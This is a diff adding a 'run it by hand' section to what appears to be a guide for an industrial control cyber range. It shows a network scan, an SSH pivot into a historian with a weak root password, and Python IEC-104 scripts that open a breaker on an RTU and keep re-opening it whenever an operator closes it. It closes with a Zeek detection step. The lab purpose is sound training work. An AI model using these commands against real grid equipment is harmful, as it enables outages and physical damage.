@@ -140,7 +140,70 @@ when done; Stop now also kills the command *inside* the container.
 ## Part 6 — Reset
 
 **Destroy** (top bar) returns to a clean, idle topology; captures/runs are stopped first.
-**Deploy** again for the next run. The scenario you authored stays saved with the topology.
+**Deploy** again for the next run. Your scenarios stay saved with the topology.
+
+---
+
+## Running it by hand (no runner)
+
+The same attack typed directly — handy for a live terminal demo, or to see exactly what the
+runner automates. SSH into the historian **once** (interactively), then everything runs
+locally on it: no `sshpass`, no base64.
+
+**On `attacker`:**
+
+```bash
+nmap -sn 10.0.5.0/24           # find the historian at .20
+ssh root@10.0.5.20             # pivot in — password: pass
+```
+
+**Then on `historian`** (a shell with a leg in both networks):
+
+```bash
+hostname; ip -o addr show      # eth0 10.0.5.20 (IT) + eth1 10.0.3.20 (OT)
+nmap -Pn -p 2404 10.0.3.50     # the RTU is open from here (it's filtered from the attacker)
+```
+
+**Open the breaker** — one IEC‑104 command (station CA 47, command point IOA 12; `False` = OPEN):
+
+```bash
+/opt/venv/bin/python3 <<'PY'
+import c104, time
+c = c104.Client(); conn = c.add_connection(ip="10.0.3.50", port=2404)
+cmd = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)
+c.start(); time.sleep(2)
+cmd.value = False                               # False = OPEN (True = CLOSE)
+print("open ->", cmd.transmit(cause=c104.Cot.ACTIVATION))
+PY
+```
+
+The HMI flips to OPEN (red) and `process-sim` goes dark.
+
+**Deny recovery** — re‑open on every operator Close (Ctrl‑C to stop; monitor point IOA 11, `True` = CLOSED):
+
+```bash
+/opt/venv/bin/python3 <<'PY'
+import c104, time
+c = c104.Client(); conn = c.add_connection(ip="10.0.3.50", port=2404)
+st = conn.add_station(common_address=47)
+state = st.add_point(io_address=11, type=c104.Type.M_SP_NA_1)
+cmd   = st.add_point(io_address=12, type=c104.Type.C_SC_NA_1)
+c.start(); time.sleep(2)
+cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)     # start tripped
+print("denying recovery — Ctrl-C to stop")
+while True:
+    conn.interrogation(common_address=47); time.sleep(0.5)
+    if state.value is True:                                   # operator re-closed on the HMI
+        cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)
+        print("operator CLOSE -> re-OPENed")
+PY
+```
+
+**Detection** — on `ids`:
+
+```bash
+grep -v '^#' /root/zeeklogs/conn.log | tail    # the control shows only as TCP to :2404
+```
 
 ---
 
